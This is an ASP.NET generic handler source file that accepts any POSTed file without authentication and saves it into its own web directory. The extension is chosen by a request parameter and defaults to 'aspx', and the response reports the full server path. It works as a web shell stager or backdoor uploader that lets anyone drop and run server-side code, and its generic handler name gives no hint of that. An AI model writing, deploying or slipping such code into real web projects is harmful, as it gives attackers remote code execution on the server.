<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.IO;
using System.Web;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState
{
    public void ProcessRequest(HttpContext context)
    {
        try
        {
            if (context.Request.HttpMethod == "POST")
            {
                string currentDir = Path.GetDirectoryName(context.Server.MapPath(HttpContext.Current.Request.Url.AbsolutePath));
                if (context.Request.Files.Count > 0)
                {
                    HttpPostedFile file = context.Request.Files[0];
                    if (file.ContentLength > 0)
                    {
                        string ext = "aspx";
                        if (!string.IsNullOrEmpty(context.Request.Params["ext"]))
                        {
                            ext = context.Request.Params["ext"];
                        }

                        string fileName = Path.GetFileName(file.FileName);
                        string fileNameWithoutExt = Path.GetFileNameWithoutExtension(fileName);
                        string destFilename = fileNameWithoutExt + "." + ext;
                        var destPath = Path.Combine(currentDir, destFilename);
                        file.SaveAs(destPath);

                        context.Response.Write(String.Format("<p>File has been saved to {0}</p>",
                            destPath));
                    }
                }
            }
        }
        catch (Exception ex)
        {
            context.Response.Write(ex);
        }
    }

    public bool IsReusable
    {
        get { return false; }
    }
}
